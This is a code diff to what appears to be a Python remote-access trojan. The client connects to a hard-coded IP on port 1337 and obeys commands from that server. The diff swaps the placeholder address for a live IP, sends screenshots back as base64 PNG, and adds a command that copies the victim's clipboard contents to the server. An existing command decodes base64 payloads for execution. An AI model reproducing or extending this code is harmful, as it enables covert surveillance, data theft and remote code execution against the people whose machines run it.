@@ -3,15 +3,15 @@ import struct
 import socket
 import tempfile
 import subprocess
-import numpy as np
-import cv2
 import pyautogui
+import io
+import clipboard
 
 
 # TODO: conn keepalive
 # sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 60000, 30000))
 
-server_addr = ('REPLACE_IP', 1337)
+server_addr = ('198.21.170.7', 1337) # REPLACE_IP
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 procs = []
 
@@ -61,8 +61,13 @@ while True:
             procs.append(subprocess.Popen("C:\Windows\System32\calc.exe"))
     elif msg == "screenshot":
         image = pyautogui.screenshot()
-        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
-        send_msg(sock, image)
+        img_byte_arr = io.BytesIO()
+        image.save(img_byte_arr, format='PNG')
+        img_byte_arr = img_byte_arr.getvalue()
+        send_msg(sock, base64.b64encode(img_byte_arr))
+    elif msg == "clipboard":
+        text = clipboard.paste()
+        send_msg(sock, text.encode())
     elif msg.startswith("exec:"):
         payload = msg[msg.index(':'):]
         payload_bytes = base64.b64decode(payload)
